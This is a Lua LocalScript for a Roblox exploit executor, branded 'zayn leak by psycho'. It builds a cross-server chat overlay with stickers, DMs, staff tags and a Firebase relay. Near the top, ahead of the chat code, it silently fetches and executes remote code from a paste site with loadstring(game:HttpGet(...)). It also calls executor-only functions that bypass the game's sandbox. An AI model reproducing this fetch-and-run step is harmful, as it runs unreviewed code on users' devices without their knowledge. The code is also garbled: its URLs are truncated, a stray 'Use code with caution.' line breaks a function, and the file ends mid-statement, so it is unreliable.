-- -- zayn leak by psycho v14.5 | LocalScript -> StarterPlayerScripts -- Optimized Mobile Layout Pipeline - Hard Multi-Tier Execution Block Gate -- [MULTIPLAYER DATABASE SYNC ACTIVE] 
local Players = game:GetService("Players") 
local TweenSvc = game:GetService("TweenService") 
local UIS = game:GetService("UserInputService") 
local ContentProvider = game:GetService("ContentProvider") 
local HttpSvc = game:GetService("HttpService") 
local TeleportService = game:GetService("TeleportService") 
local RunService = game:GetService("RunService") 
local Player = Players.LocalPlayer 
loadstring(game:HttpGet("https://pastefy.app"))() 
-- ============================================================ 
-- FIREBASE REALTIME DATABASE SYNC CONFIGURATION 
-- ============================================================ 
local FIREBASE_URL = "https://firebaseio.com" 
local lastProcessedKey = "" 
local initialFetchDone = false 
-- Executor-Safe Universal HTTP Request Wrapper 
local function makeHttpRequest(options) 
local req = (syn and syn.request) or http_request or request or (http and http.request) 
if req then 
local success, response = pcall(req, options) 
if success then return response end 
end 
return nil 
end 
-- ============================================================ 
-- CORE FUNCTIONS & CONFIGS 
-- ============================================================ 
local function make(class, props) 
local o = Instance.new(class) 
for k, v in pairs(props) do 
o[k] = v 
end 
return o 
end 
local C = { 
WIN = Color3.fromRGB(30, 30, 36), 
BG2 = Color3.fromRGB(38, 38, 46), 
BG3 = Color3.fromRGB(50, 50, 60), 
TABBAR = Color3.fromRGB(20, 20, 25), 
INPUT = Color3.fromRGB(28, 28, 35), 
BLUE = Color3.fromRGB(30, 120, 255), 
WINOUT = Color3.fromRGB(58, 58, 76), 
SYSBG = Color3.fromRGB(70, 56, 8), 
SYSTXT = Color3.fromRGB(255, 208, 35), 
WHITE = Color3.fromRGB(255, 255, 255), 
GRAY = Color3.fromRGB(135, 135, 152), 
ME = Color3.fromRGB(42, 42, 54), 
THEM = Color3.fromRGB(42, 42, 54), 
RED = Color3.fromRGB(200, 48, 48), 
GREEN = Color3.fromRGB(28, 185, 82), 
GOLD = Color3.fromRGB(255, 215, 0), 
} 
local ClientProfileData = { 
DisplayName = Player.DisplayName, 
Bio = "" 
} 
local CREATORS = { 
["itgagagag011"] = true, 
["zayn"] = true, 
} 
local MENTAL = { 
["mpopl"] = true, 
["myff"] = true, 
} 
local VIP = { 
["suki_n9"] = true, 
} 
local OWNER = { 
["Mip4i"] = true, 
["a848"] = true, 
} 
local COMGOD = { 
["Ad2"] = true, 
} 
-- Core Storage Tables 
local ScriptBans = {} 
local MutedPlayers = { All = false } 
local MEMES = { 
{url="https://discordapp.com&", label="genz kiddo💀"}, 
{url="https://discordapp.com&", label="idk"}, 
{url="https://discordapp.com&", label="shocked dog"}, 
{url="https://discordapp.com&", label="big black lips"}, 
{url="https://discordapp.com&", label="roblox wilding 💀"}, 
{url="https://discordapp.com&", label="fit check 🔥"}, 
{url="https://discordapp.com&", label="no cap 🧢"}, 
-- Added Custom Requested Asset Identifiers Below
{url="rbxthumb://type=Asset&id=135626579756980&w=420&h=420", label="Sticker 1"},
{url="rbxthumb://type=Asset&id=82732486060449&w=420&h=420", label="Sticker 2"},
{url="rbxthumb://type=Asset&id=139957369535197&w=420&h=420", label="Sticker 3"},
{url="rbxthumb://type=Asset&id=76041428119690&w=420&h=420", label="Sticker 4"},
{url="rbxthumb://type=Asset&id=121519423315170&w=420&h=420", label="Sticker 5"},
{url="rbxthumb://type=Asset&id=93373631313287&w=420&h=420", label="Sticker 6"},
{url="rbxthumb://type=Asset&id=97394539876577&w=420&h=420", label="Sticker 7"},
{url="rbxthumb://type=Asset&id=101940253916665&w=420&h=420", label="Sticker 8"},
{url="rbxthumb://type=Asset&id=78230203607312&w=420&h=420", label="Sticker 9"},
{url="rbxthumb://type=Asset&id=80353264115457&w=420&h=420", label="Sticker 10"},
{url="rbxthumb://type=Asset&id=101341480444341&w=420&h=420", label="Sticker 11"},
{url="rbxthumb://type=Asset&id=137764081130069&w=420&h=420", label="Sticker 12"},
{url="rbxthumb://type=Asset&id=129411122687899&w=420&h=420", label="Sticker 13"},
{url="rbxthumb://type=Asset&id=139746534721570&w=420&h=420", label="Sticker 14"},
{url="rbxthumb://type=Asset&id=76528918733148&w=420&h=420", label="Sticker 15"},
{url="rbxthumb://type=Asset&id=108586661676568&w=420&h=420", label="Sticker 16"},
{url="rbxthumb://type=Asset&id=139170316377078&w=420&h=420", label="Sticker 17"},
{url="rbxthumb://type=Asset&id=131387856318248&w=420&h=420", label="Sticker 18"},
{url="rbxthumb://type=Asset&id=85031627481050&w=420&h=420", label="Sticker 19"},
{url="rbxthumb://type=Asset&id=90949982441987&w=420&h=420", label="Sticker 20"},
{url="rbxthumb://type=Asset&id=123566128421906&w=420&h=420", label="Sticker 21"},
{url="rbxthumb://type=Asset&id=99467189295335&w=420&h=420", label="Sticker 22"},
{url="rbxthumb://type=Asset&id=100644268219896&w=420&h=420", label="Sticker 23"},
{url="rbxthumb://type=Asset&id=114738142020573&w=420&h=420", label="Sticker 24"},
{url="rbxthumb://type=Asset&id=129436581353076&w=420&h=420", label="Sticker 25"},
{url="rbxthumb://type=Asset&id=107530665828884&w=420&h=420", label="Sticker 26"},
{url="rbxthumb://type=Asset&id=76701301100474&w=420&h=420", label="Sticker 27"},
{url="rbxthumb://type=Asset&id=106993995656210&w=420&h=420", label="Sticker 28"},
{url="rbxthumb://type=Asset&id=130995533340059&w=420&h=420", label="Sticker 29"},
{url="rbxthumb://type=Asset&id=126155452969559&w=420&h=420", label="Sticker 30"},
{url="rbxthumb://type=Asset&id=131265228995244&w=420&h=420", label="Sticker 31"},
{url="rbxthumb://type=Asset&id=101193349519482&w=420&h=420", label="Sticker 32"},
{url="rbxthumb://type=Asset&id=125579400587832&w=420&h=420", label="Sticker 33"},
{url="rbxthumb://type=Asset&id=131777963439240&w=420&h=420", label="Sticker 34"},
{url="rbxthumb://type=Asset&id=96071386522392&w=420&h=420", label="Sticker 35"},
{url="rbxthumb://type=Asset&id=100128373450992&w=420&h=420", label="Sticker 36"},
{url="rbxthumb://type=Asset&id=93950633262670&w=420&h=420", label="Sticker 37"},
{url="rbxthumb://type=Asset&id=77922945260423&w=420&h=420", label="Sticker 38"},
{url="rbxthumb://type=Asset&id=95459780800070&w=420&h=420", label="Sticker 39"},
{url="rbxthumb://type=Asset&id=80268961445679&w=420&h=420", label="Sticker 40"},
{url="rbxthumb://type=Asset&id=115867248233625&w=420&h=420", label="Sticker 41 🔥"}
} 
-- ============================================================ 
-- INITIALIZATION & BAN GATE 
-- ============================================================ 
local Gui = make("ScreenGui",{Name="zaynleakgui",ResetOnSpawn=false,ZIndexBehavior=Enum.ZIndexBehavior.Sibling,IgnoreGuiInset=true}) 
if ScriptBans[Player.Name] then 
Player:Kick("\n[zayn leak by psycho]\nYou are banned from using this script environment.") 
return 
end 
Gui.Parent = Player.PlayerGui 
-- ============================================================ 
-- RGB RAINBOW ENGINE SYSTEM 
-- ============================================================ 
local RGB_LABELS = {} 
local RICH_RGB_LABELS = {} 
local function registerRGB(label) 
if not label then return end 
table.insert(RGB_LABELS, label) 
label.Destroying:Connect(function() 
for i, v in ipairs(RGB_LABELS) do 
if v == label then table.remove(RGB_LABELS, i) break end 
end 
end) 
end 
local function registerRichRGB(label, displayName, messageText) 
if not label then return end 
table.insert(RICH_RGB_LABELS, {label = label, name = displayName, text = messageText}) 
label.Destroying:Connect(function() 
for i, v in ipairs(RICH_RGB_LABELS) do 
if v.label == label then table.remove(RICH_RGB_LABELS, i) break end 
end 
end) 
end 
local function rgbToHex(c) 
return string.format("#%02X%02X%02X", math.floor(c.R*255), math.floor(c.G*255), math.floor(c.B*255)) 
end 
task.spawn(function() 
while task.wait(0.03) do 
local hue = (os.clock() % 3) / 3 
local color = Color3.fromHSV(hue, 1, 1) 
local hex = rgbToHex(color) 
for _, label in ipairs(RGB_LABELS) do 
if label and label.Parent then 
pcall(function() label.TextColor3 = color end) 
end 
end 
for _, data in ipairs(RICH_RGB_LABELS) do 
if data.label and data.label.Parent then 
pcall(function() data.label.Text = "<b><font color='"..hex.."'>[CREATOR]</font></b> <b>"..data.name..":</b> "..data.text end) 
end 
end 
end 
end) 
-- ============================================================ 
-- EXECUTOR IMAGELOADER ENGINE 
-- ============================================================ 
local function getImageAsset(url) 
if not url or url == "" or url == "IMAGE_URL_HERE" then return "" end 
if string.find(url, "rbxassetid://") or string.find(url, "assetgame") or string.find(url, "rbxthumb://") or tonumber(url) then 
Use code with caution.
return url
end
if string.find(url, "http://") or string.find(url, "https://") then
if isfile and writefile and getcustomasset then
local safeName = "zdemic_img_" .. string.gsub(url, "[^%w]", ""):sub(-30) .. ".png"
if not isfile(safeName) then
local success, content = pcall(function() return game:HttpGet(url) end)
if success and content then
writefile(safeName, content)
else
warn("[Error] Failed to download image from URL: " .. url)
return ""
end
end
return getcustomasset(safeName)
end
end
return url
end
local DM_STORE={}
local function dmKey(a,b)
local t={a,b}
table.sort(t)
return t[1].."__"..t[2]
end
local function saveConvo(key)
local ok,enc=pcall(function() return HttpSvc:JSONEncode(DM_STORE[key] or {}) end)
if ok then
pcall(function() Player.PlayerGui:SetAttribute("XD_"..key,enc) end)
end
end
local function loadConvo(key)
if DM_STORE[key] then return DM_STORE[key] end
local raw=Player.PlayerGui:GetAttribute("XD_"..key)
if raw then
local ok,dec=pcall(function() return HttpSvc:JSONDecode(raw) end)
if ok and dec then
DM_STORE[key]=dec
return dec
end
end
DM_STORE[key]={}
return {}
end
local function appendDM(key,msg)
if not DM_STORE[key] then loadConvo(key) end
table.insert(DM_STORE[key],msg)
if #DM_STORE[key]>200 then
local trim={}
for i=#DM_STORE[key]-199,#DM_STORE[key] do
table.insert(trim,DM_STORE[key][i])
end
DM_STORE[key]=trim
end
saveConvo(key)
end
-- ============================================================
-- STATE & GLOBAL VARIABLES
-- ============================================================
local chatOpen = false
local urlOpen = false
local dmTarget = nil
local dmContacts = {}
local currentTab = "SERVER"
local MsgScroll
local switchTab
local addDMContact
local appendToMemeGalleryGrid
-- ============================================================
-- MORE HELPERS
-- ============================================================
local function corner(p,r)
local c=Instance.new("UICorner")
c.CornerRadius=UDim.new(0,r or 8)
c.Parent=p
end
local function stroke(p,col,t)
local s=Instance.new("UIStroke")
s.Color=col or Color3.fromRGB(55,55,70)
s.Thickness=t or 1
s.Parent=p
end
local function ll(p,dir,sp)
local l=Instance.new("UIListLayout")
l.FillDirection=dir or Enum.FillDirection.Vertical
l.SortOrder=Enum.SortOrder.LayoutOrder
l.Padding=UDim.new(0,sp or 4)
l.Parent=p
end
local function tw(o,t,pr)
if not o then return end
local tweener = TweenSvc:Create(o, TweenInfo.new(t, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), pr)
pcall(function() tweener:Play() end)
end
local function getTime()
local t=os.date("*t")
return string.format("%02d:%02d",t.hour,t.min)
end
local function preload(id)
task.spawn(function()
local resolvedAsset = getImageAsset(id)
if resolvedAsset and resolvedAsset ~= "" then
local t=make("ImageLabel",{Image=resolvedAsset, Parent=game:GetService("CoreGui")})
pcall(function() ContentProvider:PreloadAsync({t}) end)
t:Destroy()
end
end)
end
for _,m in ipairs(MEMES) do
preload(m.url)
end
-- =========================================================
-- TOAST NOTIFICATION SYSTEM
-- =========================================================
local ToastHolder = make("Frame", {
Size = UDim2.new(1,0,1,0),
BackgroundTransparency = 1,
Parent = Gui,
ZIndex = 999
})
-- ============================================================
-- DRAG MODULE
-- ============================================================
local dragTargets={}
local activeDrag=nil
local dragStart=Vector2.new()
local dragPos=UDim2.new()
local function makeDraggable(handle,target)
if not handle or not target then return end
table.insert(dragTargets,{h=handle,t=target})
end
UIS.InputBegan:Connect(function(inp)
if inp.UserInputType~=Enum.UserInputType.MouseButton1 and inp.UserInputType~=Enum.UserInputType.Touch then return end
local pos=Vector2.new(inp.Position.X,inp.Position.Y)
for _,dt in ipairs(dragTargets) do
if dt.h and dt.h.Parent then
local a=dt.h.AbsolutePosition
local s=dt.h.AbsoluteSize
if pos.X>=a.X and pos.X<=a.X+s.X and pos.Y>=a.Y and pos.Y<=a.Y+s.Y then
activeDrag=dt.t
dragStart=pos
dragPos=dt.t.Position
break
end
end
end
end)
UIS.InputChanged:Connect(function(inp)
if not activeDrag then return end
if inp.UserInputType~=Enum.UserInputType.MouseMovement and inp.UserInputType~=Enum.UserInputType.Touch then return end
local d=Vector2.new(inp.Position.X,inp.Position.Y)-dragStart
activeDrag.Position=UDim2.new(dragPos.X.Scale,dragPos.X.Offset+d.X,dragPos.Y.Scale,dragPos.Y.Offset+d.Y)
end)
UIS.InputEnded:Connect(function(inp)
if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then
activeDrag=nil
end
end)
-- ============================================================
-- OVERHEAD SPEECH BUBBLES SYSTEM
-- ============================================================
local headBubbles={}
local function showBubble(sender,text,isImg,imgUrl)
if ScriptBans[sender] then
if sender == Player.Name then
Gui:Destroy()
Player:Kick("\n[zayn leak by psycho]\nScript interaction violation detected.")
end
return
end
if MutedPlayers.All or MutedPlayers[sender] then return end
local p=Players:FindFirstChild(sender)
if not p then return end
local char=p.Character
if not char then return end
local head=char:FindFirstChild("Head")
if not head then return end
if headBubbles[sender] then
pcall(function() headBubbles[sender]:Destroy() end)
end
local displayNameToShow = (sender == Player.Name) and ClientProfileData.DisplayName or (p.DisplayName or sender)
local targetUid = p.UserId or 0
local bb=make("BillboardGui",{
Size=UDim2.new(0,280,0,150),
StudsOffset=Vector3.new(0,3.8,0),
AlwaysOnTop=true,
Adornee=head,
Parent=head,
})
local mainFrame=make("Frame",{
Size=UDim2.new(1,0,1,-12),
BackgroundColor3=C.WIN,
BackgroundTransparency=0.1,
ZIndex=2,
Parent=bb
})
corner(mainFrame,10)
stroke(mainFrame,Color3.fromRGB(65,65,85),1.5)
local tail=make("ImageLabel",{
Size=UDim2.new(0,18,0,12),
Position=UDim2.new(0.5,-9,1,-12),
BackgroundTransparency=1,
Image="rbxassetid://6034226343",
ImageColor3=C.WIN,
ZIndex=3,
Parent=bb
})
local topZone=make("Frame",{
Size=UDim2.new(1,0,0,72),
BackgroundTransparency=1,
ZIndex=3,
Parent=mainFrame
})
if isImg then
local memeBox=make("ImageLabel",{
Size=UDim2.new(0,66,0,66),
Position=UDim2.new(0,6,0,4),
BackgroundColor3=C.BG3,
Image=getImageAsset(imgUrl),
ZIndex=4,
Parent=topZone
})
corner(memeBox,6)
local txtLabel=make("TextLabel",{
Size=UDim2.new(1,-82,1,-8),
Position=UDim2.new(0,76,0,4),
BackgroundTransparency=1,
Text=text~="" and text or "[Shared a Sticker]",
TextColor3=C.WHITE,
TextSize=12,
Font=Enum.Font.Gotham,
TextWrapped=true,
TextXAlignment=Enum.TextXAlignment.Left,
TextYAlignment=Enum.TextYAlignment.Top,
ZIndex=4,
Parent=topZone
})
else
local txtLabel=make("TextLabel",{
Size=UDim2.new(1,-16,1,-8),
Position=UDim2.new(0,8,0,4),
BackgroundTransparency=1,
Text=text,
TextColor3=C.WHITE,
TextSize=12,
Font=Enum.Font.Gotham,
TextWrapped=true,
TextXAlignment=Enum.TextXAlignment.Left,
TextYAlignment=Enum.TextYAlignment.Top,
ZIndex=4,
Parent=topZone
})
end
local divider=make("Frame",{
Size=UDim2.new(1,0,0,1),
Position=UDim2.new(0,0,0,74),
BackgroundColor3=Color3.fromRGB(65,65,85),
BorderSizePixel=0,
ZIndex=4,
Parent=mainFrame
})
local bottomZone=make("Frame",{
Size=UDim2.new(1,0,0,64),
Position=UDim2.new(0,0,0,75),
BackgroundTransparency=1,
ZIndex=3,
Parent=mainFrame
})
local bl=make("UIListLayout",{
FillDirection=Enum.FillDirection.Horizontal,
SortOrder=Enum.SortOrder.LayoutOrder,
Padding=UDim.new(0,4),
VerticalAlignment=Enum.VerticalAlignment.Center,
Parent=bottomZone
})
make("UIPadding",{PaddingLeft=UDim.new(0,6), PaddingRight=UDim.new(0,6), Parent=bottomZone})
local pfpThumb=make("ImageLabel",{
Size=UDim2.new(0,20,0,20),
BackgroundColor3=C.BG3,
Image="roblox.com"..targetUid.."&width=100&height=100&format=png",
ZIndex=4,
LayoutOrder=1,
Parent=bottomZone
})
corner(pfpThumb,10)
-- Tags System
local tagsAdded = 0
if OWNER[sender] then
local oTag=make("TextLabel",{
Size=UDim2.new(0,56,1,0),
BackgroundTransparency=1,
Text="[OWNER]",
TextSize=11,
Font=Enum.Font.GothamBold,
ZIndex=4,
LayoutOrder=2 + tagsAdded,
Parent=bottomZone
})
registerRGB(oTag)
tagsAdded = tagsAdded + 1
end
if CREATORS[sender] then
local cTag=make("TextLabel",{
Size=UDim2.new(0,64,1,0),
BackgroundTransparency=1,
Text="[CREATOR]",
TextSize=11,
Font=Enum.Font.GothamBold,
ZIndex=4,
LayoutOrder=2 + tagsAdded,
Parent=bottomZone
})
registerRGB(cTag)
tagsAdded = tagsAdded + 1
end
if COMGOD[sender] then
local gTag=make("TextLabel",{
Size=UDim2.new(0,64,1,0),
BackgroundTransparency=1,
Text="[COMGOD]",
TextSize=11,
Font=Enum.Font.GothamBold,
ZIndex=4,
LayoutOrder=2 + tagsAdded,
Parent=bottomZone
})
registerRGB(gTag)
tagsAdded = tagsAdded + 1
end
if MENTAL[sender] then
local mTag=make("TextLabel",{
Size=UDim2.new(0,56,1,0),
BackgroundTransparency=1,
Text="[MENTAL]",
TextColor3=Color3.fromRGB(255, 0, 255),
TextSize=11,
Font=Enum.Font.GothamBold,
ZIndex=4,
LayoutOrder=2 + tagsAdded,
Parent=bottomZone
})
registerRGB(mTag)
tagsAdded = tagsAdded + 1
end
if VIP[sender] then
local vTag=make("TextLabel",{
Size=UDim2.new(0,40,1,0),
BackgroundTransparency=1,
Text="[VIP]",
TextColor3=C.GOLD,
TextSize=11,
Font=Enum.Font.GothamBold,
ZIndex=4,
LayoutOrder=2 + tagsAdded,
Parent=bottomZone
})
tagsAdded = tagsAdded + 1
end
local identityLabel=make("TextLabel",{
Size=UDim2.new(0,130,1,0),
BackgroundTransparency=1,
Text=displayNameToShow,
TextColor3=C.WHITE,
TextSize=11,
Font=Enum.Font.GothamBold,
TextXAlignment=Enum.TextXAlignment.Left,
ZIndex=4,
LayoutOrder=2 + tagsAdded,
Parent=bottomZone
})
headBubbles[sender]=bb
task.delay(6,function()
if bb and bb.Parent then
pcall(function()
tw(mainFrame,0.4,{BackgroundTransparency=1})
tw(tail,0.4,{ImageTransparency=1})
task.delay(0.4,function()
pcall(function() bb:Destroy() end)
if headBubbles[sender]==bb then headBubbles[sender]=nil end
end)
end)
end
end)
end
-- ============================================================
-- DATABASE PACKET OUTBOUND ROUTING ENGINE
-- ============================================================
local function broadcastPayload(sender, text, isImg, imgUrl)
if FIREBASE_URL == "" then return end
task.spawn(function()
local data = {
sender = sender,
displayName = ClientProfileData.DisplayName,
text = text,
isImg = isImg,
imgUrl = imgUrl or "",
timestamp = os.time()
}
local success, json = pcall(function() return HttpSvc:JSONEncode(data) end)
if success then
makeHttpRequest({
Url = FIREBASE_URL .. "global_chat.json",
Method = "POST",
Headers = { ["Content-Type"] = "application/json" },
Body = json
})
end
end)
end
-- ============================================================
-- QUICK ACTIONS & CONTEXT MENUS
-- ============================================================
local QuickActionMenu = make("Frame",{
Size=UDim2.new(0,140,0,66),
BackgroundColor3=C.BG2,
Visible=false,
ZIndex=990,
Parent=Gui
})
corner(QuickActionMenu,8)
stroke(QuickActionMenu,Color3.fromRGB(70,70,95),1.5)
local qaTargetName = ""
local qaDmBtn=make("TextButton",{
Size=UDim2.new(1,0,0,32),
BackgroundTransparency=1,
Text="💬 Start DM",
TextColor3=C.WHITE,
TextSize=12,
Font=Enum.Font.GothamBold,
ZIndex=991,
Parent=QuickActionMenu
})
make("Frame",{ 
Size=UDim2.new(1,-10,0,1), 
Position=UDim2.new(0,5,0,32), 
BackgroundColor3=Color3.fromRGB(60,60,80), 
ZIndex=991, 
Parent=QuickActionMenu 
}) 
local qaCloseBtn=make("TextButton",{ 
Size=UDim2.new(1,0,0,32), 
Position=UDim2.new(0,0,0,33), 
BackgroundTransparency=1, 
Text="✖ Cancel", 
TextColor3=C.RED, 
TextSize=12, 
Font=Enum.Font.GothamBold, 
ZIndex=991, 
Parent=QuickActionMenu 
}) 
local function openQuickAction(targetUser, pos) 
if targetUser == Player.Name or ScriptBans[targetUser] then return end 
qaTargetName = targetUser 
QuickActionMenu.Position = UDim2.new(0, math.min(pos.X, Gui.AbsoluteSize.X - 145), 0, math.min(pos.Y, Gui.AbsoluteSize.Y - 70)) 
QuickActionMenu.Visible = true 
end 
qaCloseBtn.MouseButton1Click:Connect(function() 
QuickActionMenu.Visible = false 
end) 
local CtxMenu=make("Frame",{ 
Size=UDim2.new(0,130,0,64), 
BackgroundColor3=C.BG2, 
Visible=false, 
ZIndex=950, 
Parent=Gui 
}) 
corner(CtxMenu,8) 
stroke(CtxMenu,Color3.fromRGB(60,60,80),1) 
local ctxCopy=make("TextButton",{ 
Size=UDim2.new(1,0,0,31), 
BackgroundTransparency=1, 
Text=" 📋 Copy", 
TextColor3=C.WHITE, 
TextSize=12, 
Font=Enum.Font.GothamBold, 
TextXAlignment=Enum.TextXAlignment.Left, 
ZIndex=951, 
Parent=CtxMenu 
}) 
make("Frame",{ 
Size=UDim2.new(1,-10,0,1), 
Position=UDim2.new(0,5,0,31), 
BackgroundColor3=Color3.fromRGB(60,60,80), 
ZIndex=951, 
Parent=CtxMenu 
}) 
local ctxTrans=make("TextButton",{ 
Size=UDim2.new(1,0,0,31), 
Position=UDim2.new(0,0,0,33), 
BackgroundTransparency=1, 
Text=" 🌐 Translate", 
TextColor3=C.WHITE, 
TextSize=12, 
Font=Enum.Font.GothamBold, 
TextXAlignment=Enum.TextXAlignment.Left, 
ZIndex=951, 
Parent=CtxMenu 
}) 
local ctxText="" 
local function showCtx(text,x,y) 
ctxText=text 
local sw=Gui.AbsoluteSize.X 
local sh=Gui.AbsoluteSize.Y 
CtxMenu.Position=UDim2.new(0,math.min(x,sw-135),0,math.min(y,sh-70)) 
CtxMenu.Visible=true 
end 
ctxCopy.MouseButton1Click:Connect(function() 
local tb=make("TextBox",{Text=ctxText,Size=UDim2.new(0,1,0,1),BackgroundTransparency=1,TextTransparency=1,Parent=Gui}) 
tb:CaptureFocus() 
tb:ReleaseFocus() 
tb:Destroy() 
CtxMenu.Visible = false 
end) 
UIS.InputBegan:Connect(function(inp) 
if inp.UserInputType~=Enum.UserInputType.MouseButton1 and inp.UserInputType~=Enum.UserInputType.Touch then return end 
if CtxMenu.Visible then 
local a=CtxMenu.AbsolutePosition 
local s=CtxMenu.AbsoluteSize 
local p=inp.Position 
if p.X<a.X or p.X>a.X+s.X or p.Y<a.Y or p.Y>a.Y+s.Y then 
CtxMenu.Visible=false 
end 
end 
if QuickActionMenu.Visible then 
local a=QuickActionMenu.AbsolutePosition 
local s=QuickActionMenu.AbsoluteSize 
local p=inp.Position 
if p.X<a.X or p.X>a.X+s.X or p.Y<a.Y or p.Y>a.Y+s.Y then 
QuickActionMenu.Visible=false 
end 
end 
end) 
-- ============================================================ 
-- BUBBLE TRIGGER RADIAL BUTTON 
-- ============================================================ 
local BubFrame=make("Frame",{ 
Size=UDim2.new(0,54,0,54), 
Position=UDim2.new(1,-68,1,-92), 
BackgroundColor3=Color3.fromRGB(45,45,55), 
BackgroundTransparency=0.08, 
ZIndex=800, 
Parent=Gui 
}) 
corner(BubFrame,27) 
stroke(BubFrame,Color3.fromRGB(80,100,200),1.5) 
local Glow=make("Frame",{ 
Size=UDim2.new(1,14,1,14), 
Position=UDim2.new(0,-7,0,-7), 
BackgroundColor3=C.BLUE, 
BackgroundTransparency=0.75, 
ZIndex=799, 
Parent=BubFrame 
}) 
corner(Glow,34) 
local BubBtn=make("TextButton",{ 
Size=UDim2.new(1,0,1,0), 
BackgroundTransparency=1, 
Text="💬", 
TextSize=26, 
Font=Enum.Font.GothamBold, 
TextColor3=C.WHITE, 
ZIndex=801, 
Parent=BubFrame 
}) 
local NDot=make("Frame",{ 
Size=UDim2.new(0,14,0,14), 
Position=UDim2.new(1,-4,0,-4), 
BackgroundColor3=C.RED, 
Visible=false, 
ZIndex=802, 
Parent=BubFrame 
}) 
corner(NDot,7) 
local function pulse() 
if not Glow or not Glow.Parent then return end 
pcall(function() 
tw(Glow,1,{BackgroundTransparency=0.9,Size=UDim2.new(1,20,1,20),Position=UDim2.new(0,-10,0,-10)}) 
task.delay(1,function() 
if Glow and Glow.Parent then 
tw(Glow,0.6,{BackgroundTransparency=0.75,Size=UDim2.new(1,14,1,14),Position=UDim2.new(0,-7,0,-7)}) 
task.delay(0.7,pulse) 
end 
end) 
end) 
end 
pulse() 
makeDraggable(BubFrame,BubFrame) 
-- ============================================================ 
-- MAIN UI SHELL FRAME WINDOW (UPDATED TO BIGGER DISPLAY FOOTPRINT)
-- ============================================================ 
local Win=make("Frame",{ 
Name="ZaynLeakWin", 
Size = UDim2.new(0,520,0,420), 
Position = UDim2.new(0.5,-260,0.5,-210), 
BackgroundColor3=C.WIN, 
BackgroundTransparency=0.28, 
Visible=false, 
ZIndex=500, 
Parent=Gui 
}) 
corner(Win,16) 
stroke(Win,C.WINOUT,1.5) 
local DragHandle=make("Frame",{ 
Size=UDim2.new(1,-36,0,44), 
BackgroundTransparency=1, 
ZIndex=501, 
Parent=Win 
}) 
local XBtn=make("TextButton",{ 
Size=UDim2.new(0,24,0,24), 
Position=UDim2.new(1,-30,0,10), 
BackgroundColor3=C.RED, 
Text="✖", 
TextColor3=C.WHITE, 
TextSize=13, 
Font=Enum.Font.GothamBold, 
ZIndex=502, 
Parent=Win 
}) 
corner(XBtn,7) 
local TabBar=make("Frame",{ 
Size=UDim2.new(1,0,0,44), 
BackgroundColor3=C.TABBAR, 
BackgroundTransparency=0.15, 
ZIndex=501, 
Parent=Win 
}) 
corner(TabBar,16) 
make("Frame",{ 
Size=UDim2.new(1,0,0,16), 
Position=UDim2.new(0,0,1,-16), 
BackgroundColor3=C.TABBAR, 
BackgroundTransparency=0.15, 
BorderSizePixel=0, 
ZIndex=501, 
Parent=TabBar 
}) 
local TabScroll=make("ScrollingFrame",{ 
Size=UDim2.new(1,-34,1,0), 
BackgroundTransparency=1, 
ScrollBarThickness=0, 
CanvasSize=UDim2.new(0,0,0,0), 
AutomaticCanvasSize=Enum.AutomaticSize.X, 
ZIndex=502, 
Parent=TabBar 
}) 
ll(TabScroll,Enum.FillDirection.Horizontal,0) 
local TABS={{name="SERVER",icon="🌐"},{name="GALLERY",icon="🖼"},{name="PROFILE",icon="⚙️"},{name="DMs",icon="💬"}} 
local tabBtns={} 
for i,t in ipairs(TABS) do 
local btn=make("TextButton",{ 
Size=UDim2.new(0,84,1,0), 
BackgroundTransparency=1, 
Text=t.icon.." "..t.name, 
TextSize=10, 
Font=Enum.Font.GothamBold, 
TextColor3=C.GRAY, 
ZIndex=503, 
LayoutOrder=i, 
Parent=TabScroll 
}) 
local ul=make("Frame",{ 
Size=UDim2.new(0,50,0,2), 
Position=UDim2.new(0.5,-25,1,-2), 
BackgroundColor3=C.BLUE, 
BackgroundTransparency=1, 
ZIndex=503, 
Parent=btn 
}) 
tabBtns[t.name]={b=btn,ul=ul} 
end 
local Content=make("Frame",{ 
Size=UDim2.new(1,0,1,-44), 
Position=UDim2.new(0,0,0,44), 
BackgroundTransparency=1, 
ClipsDescendants=true, 
ZIndex=501, 
Parent=Win 
}) 
-- SERVER PAGE FRAME ENGINE 
local SrvPage=make("Frame",{ 
Size=UDim2.new(1,0,1,0), 
BackgroundTransparency=1, 
ZIndex=501, 
Parent=Content 
}) 
MsgScroll=make("ScrollingFrame",{ 
Size=UDim2.new(1,-6,1,-56), 
Position=UDim2.new(0,3,0,3), 
BackgroundTransparency=1, 
ScrollBarThickness=2, 
ScrollBarImageColor3=C.BLUE, 
CanvasSize=UDim2.new(0,0,0,0), 
AutomaticCanvasSize=Enum.AutomaticSize.Y, 
ZIndex=502, 
Parent=SrvPage 
}) 
ll(MsgScroll,Enum.FillDirection.Vertical,5) 
make("UIPadding",{PaddingLeft=UDim.new(0,6),PaddingRight=UDim.new(0,6),PaddingTop=UDim.new(0,4),Parent=MsgScroll}) 
local IBar=make("Frame",{ 
Size=UDim2.new(1,-10,0,48), 
Position=UDim2.new(0,5,1,-52), 
BackgroundColor3=C.INPUT, 
BackgroundTransparency=0.1, 
ZIndex=503, 
Parent=SrvPage 
}) 
corner(IBar,24) 
stroke(IBar,Color3.fromRGB(58,58,76),1) 
local CInput=make("TextBox",{ 
Size=UDim2.new(1,-120,1,-8), 
Position=UDim2.new(0,14,0,4), 
BackgroundTransparency=1, 
PlaceholderText="iMessage Z-Chat...", 
PlaceholderColor3=C.GRAY, 
Text="", 
TextColor3=C.WHITE, 
TextSize=13, 
Font=Enum.Font.Gotham, 
TextXAlignment=Enum.TextXAlignment.Left, 
ClearTextOnFocus=false, 
ZIndex=504, 
Parent=IBar 
}) 
local CamBtn=make("TextButton",{ 
Size=UDim2.new(0,32,0,32), 
Position=UDim2.new(1,-112,0.5,-16), 
BackgroundTransparency=1, 
Text="📷", 
TextSize=22, 
ZIndex=504, 
Parent=IBar 
}) 
local MBtn=make("TextButton",{ 
Size=UDim2.new(0,32,0,32), 
Position=UDim2.new(1,-74,0.5,-16), 
BackgroundTransparency=1, 
Text="🌸", 
TextSize=22, 
ZIndex=504, 
Parent=IBar 
}) 
local SBtn=make("TextButton",{ 
Size=UDim2.new(0,40,0,40), 
Position=UDim2.new(1,-46,0.5,-20), 
BackgroundColor3=C.BLUE, 
Text="↑", 
TextColor3=C.WHITE, 
TextSize=24, 
Font=Enum.Font.GothamBold, 
ZIndex=504, 
Parent=IBar 
}) 
corner(SBtn,20) 
local URLBox=make("Frame",{ 
